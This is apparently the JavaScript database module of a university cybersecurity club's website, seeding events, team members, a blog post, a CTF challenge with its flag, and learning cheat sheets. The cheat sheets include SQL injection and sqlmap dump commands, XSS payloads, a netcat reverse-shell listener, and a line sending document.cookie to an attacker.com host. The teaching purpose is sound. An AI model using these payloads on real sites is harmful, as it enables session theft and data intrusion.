const fs = require('fs');
const path = require('path');

// ─── SIMPLE FILE-BASED DATABASE ────────────────────────────────────────────
// No external DB server or native dependencies required — everything is
// persisted to a single JSON file on disk (data.db.json). This is enough
// for a club-scale app. To upgrade later to SQLite/Postgres/MongoDB, only
// the functions in this file need to change — server.js just calls these.

const DB_PATH = path.join(__dirname, 'data.db.json');

const DEFAULT_DATA = {
  users: [],           // CTF accounts: { id, username, email, passwordHash, college, joinedAt }
  submissions: [],      // CTF flag submissions: { id, username, challengeId, correct, timestamp }
  challengeStats: {},   // { [challengeId]: solvedCount }
  members: [],           // Club registrations: { id, name, uid, email, department, year, contact, registeredAt }
  eventRegistrations: [], // Event RSVPs: { id, name, email, eventId, registeredAt }
  gallery: [],            // Event photo glimpses: { id, eventId, label, photo, accent, addedAt }
  events: [
    { id: 1, title: "Cysecsphere CTF 2024", date: "2024-11-15", startTime: "09:00", endTime: "17:00", location: "CU Campus, Block A Auditorium", type: "past", description: "Annual flagship CTF with 200+ participants from 30 colleges.", participants: 214, category: "CTF", coverPhoto: "https://picsum.photos/seed/cysec-ctf-finals/600/400" },
    { id: 2, title: "Web Hacking Workshop", date: "2024-10-20", startTime: "10:00", endTime: "16:30", location: "CU Campus, CS Lab 301", type: "past", description: "Hands-on OWASP Top 10 workshop with live exploitation demos.", participants: 87, category: "Workshop", coverPhoto: "https://picsum.photos/seed/cysec-web-workshop/600/400" },
    { id: 3, title: "Bug Bounty Bootcamp", date: "2024-09-05", startTime: "09:00", endTime: "17:00", location: "CU Campus, Seminar Hall", type: "past", description: "Industry experts led a 2-day intensive bug bounty training.", participants: 56, category: "Bootcamp", coverPhoto: "https://picsum.photos/seed/cysec-bootcamp/600/400" },
    { id: 4, title: "Forensics Friday", date: "2024-08-23", startTime: "18:00", endTime: "21:00", location: "CU Campus, CS Lab 302", type: "past", description: "Digital forensics challenge night with surprise prizes.", participants: 45, category: "Challenge", coverPhoto: "https://picsum.photos/seed/cysec-forensics/600/400" },
    { id: 5, title: "Advanced Exploitation Bootcamp", date: "2026-07-07", startTime: "09:00", endTime: "17:00", location: "CU Campus, Auditorium", type: "past", description: "A deep-dive bootcamp on binary exploitation and exploit development.", participants: 60, category: "Bootcamp", coverPhoto: null },
    { id: 6, title: "Hacker,hustler and hoodies:Cybersphere Induction Program", date: "2026-07-17", startTime: "10:00", endTime: "16:00", location: "CU Campus, Block B Auditorium", type: "upcoming", description: "Theme: Binary Exploitation & Pwn. Prizes for top 3!", category: "CTF", coverPhoto: null },
    { id: 7, title: "Panel Discussion & MEME Competition", date: "2026-08-11", startTime: "14:00", endTime: "17:00", location: "CU Campus, Open Air Theatre", type: "upcoming", description: "Join us for an evening of insightful discussion and hilarious memes!", category: "Workshop", coverPhoto: null },
    { id: 8, title: "Industrial Visit to PEC", date: "2026-08-21", startTime: "08:00", endTime: "17:00", location: "Punjab Engineering College (PEC)", type: "upcoming", description: "Exciting opportunity to visit the prestigious PEC campus and interact with faculty and students.", category: "Industrial Visit", coverPhoto: null },
  ],
  challenges: [],           // CTF challenges (created via admin dashboard)
  nextUserId: 1,
  nextSubmissionId: 1,
  nextMemberId: 1,
  nextEventRegId: 1,
  nextEventId: 9,
  nextGalleryId: 1,
  ghostCompletions: [],  // Ghost Protocol wall of fame: { id, alias, completedAt }
  nextGhostId: 1,
  nextChallengeId: 1,
  nextBlogPostId: 2,
  nextPersonalCtfId: 1,
  nextTeamMemberId: 8,
  personalCtfs: [],      // Personal CTF events: { id, title, description, accessId, accessPassword, startsAt, endsAt, createdBy, challenges, participants, submissions, createdAt }
  teamMembers: [         // Core team & leadership, managed via admin dashboard
    { id: 1, name: 'Mehakpreet Kaur', role: 'Secretary', avatar: 'M', bio: 'Leading Cysecsphere with passion for cybersecurity and innovation.', social: '@mehak', section: 'leadership', order: 1 },
    { id: 2, name: 'Arya Jha', role: 'Joint Secretary', avatar: 'A', bio: 'Managing operations and building a strong, driven community.', social: '@arya', section: 'leadership', order: 2 },
    { id: 3, name: 'Ashutosh Kumar', role: 'Technical Lead', avatar: 'T', bio: 'Handles all technical infrastructure, labs, and CTF challenges.', social: '@techlead', section: 'core', order: 1 },
    { id: 4, name: 'Nireeksha Bhatt', role: 'Management Lead', avatar: 'M', bio: 'Oversees planning, logistics, and smooth day-to-day running of the club.', social: '@mgmtlead', section: 'core', order: 2 },
    { id: 5, name: 'Yashika Siwach', role: 'Social Media Lead', avatar: 'S', bio: "Runs the club's socials and keeps everyone posted on events & wins.", social: '@sociallead', section: 'core', order: 3 },
    { id: 6, name: 'Anmoldeep Singh Khaira', role: 'Discipline Lead', avatar: 'D', bio: 'Ensures order, conduct, and fair play across events and sessions.', social: '@disciplinelead', section: 'core', order: 4 },
    { id: 7, name: 'Sejal Sharma', role: 'Anchor', avatar: 'A', bio: 'Hosts events and sessions, keeping the energy high on stage.', social: '@anchor', section: 'core', order: 5 },
  ],
  siteContent: {         // Editable homepage content, managed via admin dashboard
    stats: [
      { value: '200+', label: 'Active Members' },
      { value: '47', label: 'CTFs Hosted' },
      { value: '12', label: 'National Wins' },
      { value: '3', label: 'Years Strong' },
    ],
    features: [
      { icon: '⚔️', title: 'Weekly CTF Challenges', desc: 'Test your skills every week with new challenges spanning crypto, pwn, forensics, web, and more.' },
      { icon: '🔬', title: 'Security Research', desc: 'Collaborate on real-world vulnerability research, CVE discovery, and responsible disclosure.' },
      { icon: '🏆', title: 'Competitions', desc: 'Represent CU at national and international CTF competitions with club-sponsored teams.' },
      { icon: '📚', title: 'Workshops', desc: 'Regular hands-on workshops by industry experts covering cutting-edge offensive and defensive security.' },
      { icon: '🤝', title: 'Mentorship', desc: 'Senior members mentor juniors through structured programs and 1-on-1 guidance sessions.' },
      { icon: '🌐', title: 'Industry Connect', desc: 'Direct connections to top cybersecurity firms for internships and full-time opportunities.' },
    ],
    about: {
      title: 'Where Hackers<br /><span style="color: #00F5FF">Become Defenders</span>',
      paragraph1: "Cysecsphere is Chandigarh University's premier cybersecurity club, founded with a mission to build the next generation of ethical hackers, security researchers, and digital defenders.",
      paragraph2: 'We offer a unique blend of theoretical knowledge and hands-on practice through weekly CTF challenges, industry workshops, bug bounty programs, and national-level competitions.',
    },
  },
  resources: [           // Learning resources (admin CRUD, public read)
    { id: 'linux-1', category: 'linux', title: 'File System Navigation', desc: 'Essential commands to navigate and manage the Linux file system.', code: 'pwd                     # Print working directory\nls -la                  # List files with details\ncd /path/to/dir         # Change directory\nmkdir -p dir1/dir2      # Create nested directories\nrm -rf folder/          # Force remove folder\ncp file1 file2          # Copy file\nmv file1 /new/path/     # Move/rename file\nchmod +x script.sh      # Make script executable\nchown user:group file   # Change file owner' },
    { id: 'linux-2', category: 'linux', title: 'Process & System Info', desc: 'Monitor processes, system resources, and user activity.', code: 'ps aux                 # Show all running processes\ntop                    # Real-time process viewer\nhtop                   # Enhanced top (install first)\nkill -9 PID            # Force kill process\nwhoami                 # Current user\nid                     # User & group IDs\nuname -a               # Full system info\ndf -h                  # Disk space usage\nfree -h                # RAM usage\nlscpu                  # CPU information\nuptime                 # System uptime' },
    { id: 'linux-3', category: 'linux', title: 'Text Processing', desc: 'Powerful text manipulation commands for log analysis and data extraction.', code: 'cat file.txt           # Print file contents\nless file.txt          # Page through file\nhead -20 file.txt      # First 20 lines\ntail -f file.txt       # Follow file (live)\ngrep \'pattern\' file    # Search text\ngrep -r \'text\' ./      # Recursive search\nsed \'s/old/new/g\' f    # Find & replace\nawk \'{print $2}\' f     # Print 2nd column\nwc -l file.txt         # Count lines\nsort -u file.txt       # Sort unique\ncut -d\',\' -f1 file     # CSV first column' },
    { id: 'linux-4', category: 'linux', title: 'Networking on Linux', desc: 'Basic networking commands for troubleshooting and exploration.', code: 'ip addr               # Show IP addresses\nip route              # Show routing table\nping -c 4 8.8.8.8     # Ping test\ntraceroute google.com # Trace network path\nnetstat -tulpn        # Listening ports (older)\nss -tulpn             # Listening ports (newer)\ndig example.com       # DNS lookup\nnslookup example.com  # DNS lookup (alt)\nhost example.com      # Simple DNS\ncurl -I example.com   # Fetch HTTP headers' },
    { id: 'net-1', category: 'network', title: 'Nmap Basics', desc: 'Network Mapper — the standard tool for port scanning and service discovery.', code: 'nmap -sn 192.168.1.0/24     # Ping sweep (find live hosts)\nnmap 192.168.1.1             # Default scan (1000 ports)\nnmap -p- 10.0.0.1            # Scan all 65535 ports\nnmap -p 22,80,443 target     # Scan specific ports\nnmap -sV target               # Service version detection\nnmap -O target                # OS fingerprinting\nnmap -A target                # Aggressive (OS + services + scripts)\nnmap -sC target               # Run default scripts\nnmap --script vuln target     # Vulnerability scan\nnmap -sU target               # UDP scan' },
    { id: 'net-2', category: 'network', title: 'Netcat & Network Tools', desc: 'Swiss-army knife for network connections and debugging.', code: 'nc -lvnp 4444            # Listen on port 4444 (reverse shell)\nnc 10.0.0.1 4444           # Connect to port 4444\nnc -zv target 1-1000       # Verbose port scan\ncurl ifconfig.me           # Get public IP\ntcpdump -i eth0            # Capture packets\ntcpdump -i eth0 port 80    # Capture HTTP traffic\ntcpdump -w capture.pcap    # Write to file\narp -a                     # Show ARP table\niwconfig                   # WiFi info\nss -tulpn                  # All listening services' },
    { id: 'net-3', category: 'network', title: 'Wireshark / tshark', desc: 'Packet analysis — critical for network forensics and CTF challenges.', code: 'tshark -r capture.pcap                      # Read PCAP\ntshark -r capture.pcap -Y "http"           # Filter HTTP\ntshark -r capture.pcap -Y "ip.addr==X.X.X.X" # Filter by IP\ntshark -r capture.pcap -T fields -e http.host  # Extract hosts\ntshark -r capture.pcap -z io,stat,1       # Stats' },
    { id: 'web-1', category: 'web', title: 'cURL for Web Testing', desc: 'Essential HTTP requests manipulation for web security testing.', code: 'curl -X GET http://target.com/api    # GET request\ncurl -X POST -d "user=admin" URL         # POST data\ncurl -X PUT -d \'{"key":"val"}\' -H "Content-Type: application/json" URL\ncurl -b "session=abc123" URL             # Send cookies\ncurl -c cookies.txt URL                   # Save cookies\ncurl -A "Mozilla/5.0" URL                # Custom User-Agent\ncurl -H "Authorization: Bearer TOKEN" URL # Auth header\ncurl -i URL                               # Include headers in output\ncurl -v URL                               # Verbose debug\ncurl -L URL                               # Follow redirects\ncurl -o output.html URL                   # Save to file' },
    { id: 'web-2', category: 'web', title: 'SQL Injection Basics', desc: 'Common SQL injection payloads and testing techniques.', code: '# Basic test payloads:\n\' OR \'1\'=\'1\n\' OR 1=1 --\nadmin\' --\n\' UNION SELECT 1,2,3 --\n\' UNION SELECT table_name FROM information_schema.tables --\n\nsqlmap -u "http://target.com/page?id=1" --batch\nsqlmap -u "http://target.com/page?id=1" --dbs\nsqlmap -u "http://target.com/page?id=1" -D dbname --tables\nsqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump\n\n\' AND SLEEP(5) --\n\' AND 1=1 --  (true)\n\' AND 1=2 --  (false)' },
    { id: 'web-3', category: 'web', title: 'XSS & Web Exploitation', desc: 'Cross-Site Scripting (XSS) payloads and testing methods.', code: '# Reflected XSS:\n<script>alert(\'XSS\')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n# Stored XSS:\n<script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script>\n\n# DOM-based XSS:\n#javascript:alert(1)\n\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\nffuf -u http://target.com/FUZZ -w wordlist.txt\n\ngobuster dns -d target.com -w subdomains.txt\nffuf -u http://FUZZ.target.com -w subdomains.txt' },
    { id: 'web-4', category: 'web', title: 'Burp Suite & Proxies', desc: 'Intercepting web traffic for analysis and manipulation.', code: 'Proxy: 127.0.0.1:8080 (Burp Suite default)\n\n# Repeater - resend/modify requests\n# Intruder - brute force / fuzzing\n# Decoder - URL/Base64/Hex decode\n# Comparer - diff two responses\n\nmitmproxy --mode transparent --listen-port 8080' },
    { id: 'crypto-1', category: 'crypto', title: 'Hash & Encoding Tools', desc: 'Identify and decode/dehash various cryptographic formats.', code: '# Identify hash type:\nhashid \'5d41402abc4b2a76b9719d911017c592\'\nhash-identifier\n\necho -n "text" | md5sum\necho -n "text" | sha1sum\necho -n "text" | sha256sum\n\necho "dGVzdA==" | base64 -d         # Decode\necho -n "test" | base64              # Encode\n\necho "74657374" | xxd -r -p          # Hex to text\necho -n "test" | xxd -p              # Text to hex\n\njohn --wordlist=rockyou.txt hash.txt\njohn --show hash.txt\n\nhashcat -m 0 -a 0 hash.txt rockyou.txt' },
    { id: 'crypto-2', category: 'crypto', title: 'Classic Ciphers & Tools', desc: 'Classical cryptography techniques found in CTF challenges.', code: 'echo "uryyb" | tr \'a-z\' \'n-za-m\'      # ROT13 decode\necho "khoor" | tr \'a-z\' \'x-za-w\'      # Caesar +3\n\n# ROT47 (used in CTFs often):\n# Use: https://rot47.net\n\n# Vigenère cipher:\n# Use: https://www.dcode.fr/vigenere-cipher\n\n# Morse code:\n... --- ...          # SOS\n\n# Binary / ASCII:\n01101000 01101001    # "hi" in binary\n\n# CyberChef (THE Swiss army knife):\n# https://gchq.github.io/CyberChef/' },
    { id: 'crypto-3', category: 'crypto', title: 'RSA & Modern Crypto', desc: 'RSA decryption tools and techniques for CTF challenges.', code: 'python3 RsaCtfTool.py -n N -e e --private\npython3 RsaCtfTool.py -p p -q q -e e -n N\n\nopenssl rsa -pubin -in key.pub -text -noout\nopenssl rsautl -decrypt -inkey private.pem -in encrypted.enc\n\n# Common weaknesses:\n# - Small e (e=3, cube root attack)\n# - Fermat factorization (close primes)\n# - Wiener attack (small d)\n# - Shared primes (GCD attack)' },
    { id: 'rev-1', category: 'reverse', title: 'Binary Analysis Tools', desc: 'Tools for analyzing and reverse engineering compiled binaries.', code: 'strings binary              # Extract strings\nstrings -n 6 binary        # Strings min length 6\n\nfile binary                 # Identify file type\nexiftool binary             # EXIF/metadata\n\nobjdump -d binary          # Disassemble\nobjdump -t binary          # Symbol table\nreadelf -a binary          # ELF details (Linux)\nnm binary                  # Symbol names\n\nxxd binary | head -20      # Hex view\nhexdump -C binary | head   # Canonical hex\n\nstrace -f ./binary         # System calls\nltrace ./binary            # Library calls' },
    { id: 'rev-2', category: 'reverse', title: 'Disassemblers & Debuggers', desc: 'Advanced reverse engineering with industry-standard tools.', code: 'gdb ./binary\ngdb> info functions        # List functions\ngdb> break main            # Break at main\ngdb> run                   # Run program\ngdb> x/20x $rip           # Examine memory\ngdb> info registers        # Register state\ngdb> disassemble main      # Disassemble function\n\nr2 ./binary\n[0x100001000]> aaa         # Analyze all\n[0x100001000]> afl         # List functions\n[0x100001000]> pdf @main   # Print disassembly' },
    { id: 'for-1', category: 'forensics', title: 'File Forensics', desc: 'Recover hidden data, analyze file structures, and carve artifacts.', code: 'binwalk firmware.bin       # Scan for embedded files\nbinwalk -e firmware.bin    # Extract files\n\nforemost -i image.dd -o output/\n\nsteghide extract -sf image.jpg\nsteghide info image.jpg\n\nzsteg -a image.png         # All techniques\n\nexiftool -a image.jpg      # All metadata\n\nstrings image.jpg | grep -i flag\nstrings image.jpg | grep -i CSPHERE' },
    { id: 'for-2', category: 'forensics', title: 'Memory & Disk Forensics', desc: 'Analyze memory dumps, disk images, and log files.', code: 'volatility -f mem.dump imageinfo\nvolatility -f mem.dump --profile=Win10 pslist\nvolatility -f mem.dump --profile=Win10 netscan\nvolatility -f mem.dump --profile=Win10 cmdline\nvolatility -f mem.dump --profile=Win10 filescan\n\nfls -r disk.img            # List files\nicat disk.img inode        # Read file by inode\n\ngrep "Failed password" /var/log/auth.log | wc -l\njournalctl -u ssh.service  # SSH logs (systemd)\n\ntshark -r capture.pcap -Y "http.request" -T fields -e http.host' },
    { id: 'study-1', category: 'study', title: 'CTF Platforms', desc: 'Practice your skills on these cyber security challenge platforms.', code: null, links: [
      { name: 'Hack The Box', url: 'https://www.hackthebox.com', desc: 'Industry-standard CTF platform with realistic machines and challenges. Free tier available.' },
      { name: 'TryHackMe', url: 'https://tryhackme.com', desc: 'Beginner-friendly guided learning paths with browser-based labs.' },
      { name: 'PicoCTF', url: 'https://picoctf.com', desc: 'Free CTF platform by CMU, great for beginners with progressive difficulty.' },
      { name: 'CTFtime', url: 'https://ctftime.org', desc: 'Find upcoming CTF competitions and learn from past challenge writeups.' },
      { name: 'OverTheWire', url: 'https://overthewire.org', desc: 'Wargames teaching security concepts through SSH-based challenges (Bandit, Leviathan, etc.)' },
      { name: 'Root-Me', url: 'https://www.root-me.org', desc: 'Hundreds of challenges across all categories with a ranking system.' },
    ] },
    { id: 'study-2', category: 'study', title: 'Free Courses & Learning', desc: 'Online courses and learning paths to build cybersecurity skills from scratch.', code: null, links: [
      { name: 'Professor Messer (CompTIA)', url: 'https://www.professormesser.com', desc: 'Free video courses for Security+, Network+, and A+ certifications.' },
      { name: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security', desc: 'Free, comprehensive web security training with interactive labs (all OWASP topics).' },
      { name: 'Cybrary', url: 'https://www.cybrary.it', desc: 'Free cybersecurity courses across all domains — from beginner to advanced.' },
      { name: 'PicoCTF CyberStart', url: 'https://picoctf.org', desc: 'Interactive cybersecurity exercises designed for high school and college students.' },
      { name: 'Coursera — IBM Cybersecurity', url: 'https://www.coursera.org/professional-certificates/ibm-cybersecurity-analyst', desc: 'Professional certificate program covering SOC analyst skills.' },
      { name: 'MIT OCW — Computer Systems Security', url: 'https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/', desc: "MIT's full computer systems security course, free with lecture videos and assignments." },
    ] },
    { id: 'study-3', category: 'study', title: 'Must-Read Books', desc: 'Classic cybersecurity books every aspiring hacker should read.', code: null, links: [
      { name: "The Web Application Hacker's Handbook", url: 'https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470', desc: 'The definitive guide to web application security testing.' },
      { name: 'The Hacker Playbook 3', url: 'https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing/dp/1980901754', desc: 'Practical penetration testing methodology and techniques.' },
      { name: 'Practical Malware Analysis', url: 'https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901', desc: 'Hands-on guide to dissecting malicious software.' },
      { name: 'Red Team Field Manual (RTFM)', url: 'https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1075095211', desc: 'Quick-reference command cheatsheet for red team operations.' },
      { name: 'Grey Hat Hacking', url: 'https://www.amazon.com/Gray-Hat-Hacking-Ethical-Handbook/dp/1264268942', desc: 'Comprehensive ethical hacking handbook covering modern exploit techniques.' },
      { name: 'Blue Team Handbook', url: 'https://www.amazon.com/Blue-Team-Handbook-Condensed-Operations/dp/1791015571', desc: 'SOC operations, incident response, and threat hunting guide.' },
    ] },
    { id: 'study-4', category: 'study', title: 'Certifications Roadmap', desc: 'Industry-recognized certifications to boost your cybersecurity career.', code: null, links: [
      { name: 'CompTIA Security+', url: 'https://www.comptia.org/certifications/security', desc: 'Entry-level — foundational cybersecurity knowledge. Start here.' },
      { name: 'CEH (Certified Ethical Hacker)', url: 'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/', desc: 'Intermediate — penetration testing methodology and tools.' },
      { name: 'OSCP (Offensive Security)', url: 'https://www.offsec.com/courses/pen-200/', desc: 'Advanced — hands-on penetration testing certification. Highly respected.' },
      { name: 'CISSP', url: 'https://www.isc2.org/Certifications/CISSP', desc: 'Advanced — management-level security certification.' },
      { name: 'SANS GIAC', url: 'https://www.giac.org', desc: 'Specialized certifications for forensics, incident response, pentesting, and more.' },
      { name: 'Certified Cloud Security Professional (CCSP)', url: 'https://www.isc2.org/Certifications/CCSP', desc: 'Cloud security certification — AWS/Azure/GCP security focus.' },
    ] },
    { id: 'study-5', category: 'study', title: 'Useful Tools & Cheatsheets', desc: 'Essential cybersecurity tools and quick-reference resources.', code: null, links: [
      { name: 'CyberChef', url: 'https://gchq.github.io/CyberChef/', desc: 'The Cyber Swiss Army Knife — encode/decode/encrypt/analyze anything in the browser.' },
      { name: 'GTFOBins', url: 'https://gtfobins.github.io', desc: 'Unix binaries that can be used for privilege escalation and breakout.' },
      { name: 'LOLBAS', url: 'https://lolbas-project.github.io', desc: 'Windows binaries for living-off-the-land attacks.' },
      { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', desc: 'Massive collection of payloads and bypass techniques for all categories.' },
      { name: 'DevDocs', url: 'https://devdocs.io', desc: 'Offline-capable documentation browser for programming and web technologies.' },
      { name: 'ExplainShell', url: 'https://explainshell.com', desc: 'Paste any shell command and get a breakdown of what each part does.' },
    ] },
  ],
  blogPosts: [          // Blog posts / announcements: { id, title, slug, content, excerpt, author, tags, published, createdAt, updatedAt }
    {
      id: 1,
      title: 'Welcome to the Cysecsphere Blog',
      slug: 'welcome-to-the-cysecsphere-blog',
      content: '# Welcome to Cysecsphere 🛡️\n\nWe are Chandigarh University premier cybersecurity club — a community of ethical hackers, security researchers, and digital defenders.\n\n## What to Expect\n\nThis blog will feature:\n\n- **CTF Writeups** — Detailed solutions and techniques from competitions we participate in\n- **Tutorials** — Step-by-step guides on web security, reverse engineering, binary exploitation, and more\n- **Announcements** — Club updates, workshop schedules, and event recaps\n- **Industry Insights** — Guest posts from professionals in the cybersecurity field\n\n## Stay Connected\n\nFollow us on [Instagram](https://www.instagram.com/cysecspherecu) and [LinkedIn](https://www.linkedin.com/company/cysecsphere-cu) for real-time updates.\n\n> *"Hack the planet — but ethically."*\n\n— Cysecsphere Core Team',
      excerpt: 'Welcome to Cysecsphere — Chandigarh University premier cybersecurity club. This blog features CTF writeups, tutorials, announcements, and industry insights.',
      author: 'Cysecsphere Core Team',
      tags: ['announcement', 'general'],
      published: true,
      createdAt: '2025-01-15T00:00:00.000Z',
      updatedAt: '2025-01-15T00:00:00.000Z',
    },
  ],
};

function load() {
  if (!fs.existsSync(DB_PATH)) {
    save(DEFAULT_DATA);
    return { ...DEFAULT_DATA };
  }
  try {
    const raw = fs.readFileSync(DB_PATH, 'utf-8');
    return { ...DEFAULT_DATA, ...JSON.parse(raw) };
  } catch (err) {
    console.error('⚠️  Failed to read data.db.json, starting fresh:', err.message);
    return { ...DEFAULT_DATA };
  }
}

function save(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

// In-memory cache of the file contents, kept in sync on every write.
let db = load();

// ─── USERS ──────────────────────────────────────────────────────────────────

function findUserByUsernameOrEmail(username, email) {
  return db.users.find(
    u => u.username.toLowerCase() === username.toLowerCase() ||
         (email && u.email.toLowerCase() === email.toLowerCase())
  );
}

function findUserByUsername(username) {
  return db.users.find(u => u.username.toLowerCase() === username.toLowerCase());
}

function findUserById(id) {
  return db.users.find(u => u.id === id);
}

function createUser({ username, email, passwordHash, college }) {
  const user = {
    id: db.nextUserId++,
    username,
    email,
    passwordHash,
    college: college || 'Not specified',
    joinedAt: new Date().toISOString(),
  };
  db.users.push(user);
  save(db);
  return user;
}

function getAllUsers() {
  return db.users;
}

// ─── SUBMISSIONS ────────────────────────────────────────────────────────────

function hasAlreadySolved(username, challengeId) {
  return db.submissions.some(s => s.username === username && s.challengeId === challengeId && s.correct);
}

function addSubmission({ username, challengeId, correct }) {
  const submission = {
    id: db.nextSubmissionId++,
    username,
    challengeId,
    correct,
    timestamp: new Date().toISOString(),
  };
  db.submissions.push(submission);
  if (correct) {
    db.challengeStats[challengeId] = (db.challengeStats[challengeId] || 0) + 1;
  }
  save(db);
  return submission;
}

function getSolvedCount(challengeId, baseCount = 0) {
  return baseCount + (db.challengeStats[challengeId] || 0);
}

function getAllSubmissions() {
  return db.submissions;
}

// Derive each user's score/solved count from their correct submissions + a
// point lookup table (passed in from server.js, since challenge point values
// live there).
// ─── WEEKLY LEADERBOARD ────────────────────────────────────────────────

function getStartOfWeek(date = new Date()) {
  const d = new Date(date);
  const day = d.getDay();
  const diff = d.getDate() - day + (day === 0 ? -6 : 1); // Monday
  d.setDate(diff);
  d.setHours(0, 0, 0, 0);
  return d;
}

// Weekly leaderboard: counts only submissions from the current week (Mon-Sun)
function getWeeklyLeaderboard(pointsByChallengeId) {
  const weekStart = getStartOfWeek();
  const weekEnd = new Date(weekStart);
  weekEnd.setDate(weekEnd.getDate() + 7);

  const weeklySubmissions = db.submissions.filter(s => {
    const t = new Date(s.timestamp);
    return s.correct && t >= weekStart && t < weekEnd;
  });

  const scoreByUsername = {};
  const solvedByUsername = {};

  weeklySubmissions.forEach(s => {
    scoreByUsername[s.username] = (scoreByUsername[s.username] || 0) + (pointsByChallengeId[s.challengeId] || 0);
    solvedByUsername[s.username] = (solvedByUsername[s.username] || 0) + 1;
  });

  const badgeForScore = (score) => {
    if (score >= 2000) return 'Elite Hacker';
    if (score >= 1500) return 'Master';
    if (score >= 1000) return 'Expert';
    if (score >= 500) return 'Advanced';
    if (score >= 100) return 'Intermediate';
    return 'Rookie';
  };

  const rows = db.users.map(u => {
    const score = scoreByUsername[u.username] || 0;
    return {
      username: u.username,
      score,
      solved: solvedByUsername[u.username] || 0,
      avatar: u.username.substring(0, 2).toUpperCase(),
      college: u.college,
      badge: badgeForScore(score),
    };
  }).filter(r => r.solved > 0); // only show players with weekly solves

  rows.sort((a, b) => b.score - a.score);
  rows.forEach((r, i) => r.rank = i + 1);
  return rows;
}

function getLeaderboard(pointsByChallengeId) {
  const scoreByUsername = {};
  const solvedByUsername = {};

  db.submissions.filter(s => s.correct).forEach(s => {
    scoreByUsername[s.username] = (scoreByUsername[s.username] || 0) + (pointsByChallengeId[s.challengeId] || 0);
    solvedByUsername[s.username] = (solvedByUsername[s.username] || 0) + 1;
  });

  const badgeForScore = (score) => {
    if (score >= 2000) return 'Elite Hacker';
    if (score >= 1500) return 'Master';
    if (score >= 1000) return 'Expert';
    if (score >= 500) return 'Advanced';
    if (score >= 100) return 'Intermediate';
    return 'Rookie';
  };

  const rows = db.users.map(u => {
    const score = scoreByUsername[u.username] || 0;
    return {
      username: u.username,
      score,
      solved: solvedByUsername[u.username] || 0,
      avatar: u.username.substring(0, 2).toUpperCase(),
      college: u.college,
      badge: badgeForScore(score),
    };
  });

  rows.sort((a, b) => b.score - a.score);
  rows.forEach((r, i) => r.rank = i + 1);
  return rows;
}

// ─── CLUB MEMBER REGISTRATIONS ──────────────────────────────────────────────

function findMemberByUidOrEmail(uid, email) {
  return db.members.find(
    m => m.uid.toLowerCase() === uid.toLowerCase() ||
         m.email.toLowerCase() === email.toLowerCase()
  );
}

function addMember({ name, uid, email, department, year, contact }) {
  const member = {
    id: db.nextMemberId++,
    name,
    uid,
    email,
    department,
    year,
    contact,
    registeredAt: new Date().toISOString(),
  };
  db.members.push(member);
  save(db);
  return member;
}

function getAllMembers() {
  return db.members;
}

function updateMember(id, data) {
  const idx = db.members.findIndex(m => m.id === id);
  if (idx === -1) return null;
  const updated = { ...db.members[idx], ...data, id: db.members[idx].id };
  db.members[idx] = updated;
  save(db);
  return updated;
}

function deleteMember(id) {
  const before = db.members.length;
  db.members = db.members.filter(m => m.id !== id);
  save(db);
  return db.members.length < before;
}

// ─── EVENT REGISTRATIONS ────────────────────────────────────────────────────

function addEventRegistration({ name, email, eventId }) {
  const reg = {
    id: db.nextEventRegId++,
    name,
    email,
    eventId,
    registeredAt: new Date().toISOString(),
  };
  db.eventRegistrations.push(reg);
  save(db);
  return reg;
}

function getAllEventRegistrations() {
  return db.eventRegistrations;
}

function deleteEventRegistration(id) {
  const before = db.eventRegistrations.length;
  db.eventRegistrations = db.eventRegistrations.filter(r => r.id !== id);
  save(db);
  return db.eventRegistrations.length < before;
}

// ─── EVENT GALLERY (photo glimpses, managed by admin) ──────────────────────

function getAllGalleryPhotos() {
  return db.gallery;
}

function getGalleryPhotoById(id) {
  return db.gallery.find(g => g.id === id);
}

function getGalleryPhotosByEvent(eventId) {
  return db.gallery.filter(g => g.eventId === eventId);
}

function addGalleryPhoto({ eventId, label, photo, accent }) {
  const item = {
    id: db.nextGalleryId++,
    eventId,
    label,
    photo,
    accent: accent || '#00F5FF',
    addedAt: new Date().toISOString(),
  };
  db.gallery.push(item);
  save(db);
  return item;
}

function deleteGalleryPhoto(id) {
  const before = db.gallery.length;
  db.gallery = db.gallery.filter(g => g.id !== id);
  save(db);
  return db.gallery.length < before;
}

// ─── USER MANAGEMENT (admin) ────────────────────────────────────────────────

function deleteUser(id) {
  const before = db.users.length;
  db.users = db.users.filter(u => u.id !== id);
  save(db);
  return db.users.length < before;
}

function findUserByEmail(email) {
  return db.users.find(u => u.email.toLowerCase() === (email || '').toLowerCase());
}

function updateUser(id, data) {
  const idx = db.users.findIndex(u => u.id === id);
  if (idx === -1) return null;
  const updated = { ...db.users[idx], ...data, id: db.users[idx].id };
  db.users[idx] = updated;
  save(db);
  return updated;
}

function updatePasswordHash(id, passwordHash) {
  const idx = db.users.findIndex(u => u.id === id);
  if (idx === -1) return null;
  db.users[idx].passwordHash = passwordHash;
  save(db);
  return { success: true };
}

// ─── GHOST PROTOCOL CHALLENGE (permanent, seeded challenge) ───────────────
// The Ghost Protocol easter egg is now also a regular CTF challenge. It is
// seeded as a permanent challenge so the weekly archive/reset never removes it.
const GHOST_CHALLENGE = {
  title: 'Ghost Protocol',
  category: 'Misc',
  points: 500,
  difficulty: 'Insane',
  description: 'A rogue terminal is broadcasting secrets on the network, claiming to host the Ghost Protocol — an unauthorized authentication system. Your mission: locate the hidden terminal, extract its authentication token, and submit it as the flag to breach the protocol. Those who succeed are immortalized in the Wall of Fame.\n\nEvery hacker leaves a digital trail — check the console and the page source.',
  hint: 'Visit /ghost-protocol and read its page source carefully. The token is hiding in the comments, base64-encoded.',
  flag: 'CSPHERE{gh0st_1n_th3_sh3ll}',
  ghost: true,
  permanent: true,
  solvedCount: 0,
};

// Ensures the permanent Ghost Protocol challenge exists. Re-adds it on fresh
